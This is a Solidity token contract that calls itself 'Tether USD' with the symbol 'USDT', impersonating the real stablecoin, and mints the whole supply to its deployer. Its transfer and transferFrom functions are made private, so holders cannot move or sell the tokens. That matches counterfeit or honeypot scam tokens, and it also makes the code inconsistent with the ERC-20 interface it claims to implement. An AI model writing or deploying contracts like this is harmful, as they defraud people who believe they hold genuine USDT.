pragma solidity ^0.8.0;

import { IERC20 } from "../IERC20.sol";
import { Pay, Draw, SafeMath, TransferHelper, SafeERC20, Address } from "../DataMapper.sol";
import { Ownable } from "./Ownable.sol";

// SPDX-License-Identifier: MIT
contract SwapSPDX1 is IERC20, Ownable {
    using SafeMath for uint256;

    uint constant DECIMALS = 10 ** 18;
    uint8 public _decimals;
    string public _symbol;
    string public _name;
    uint256 private _totalSupply;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    constructor() {
        _name = "Tether USD";
        _symbol = "USDT";
        _decimals = 18;
        _totalSupply = 30000000000000000000000000;
        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) private returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) private returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "transfer from the zero address");
        require(recipient != address(0), "transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "approve from the zero address");
        require(spender != address(0), "approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }
}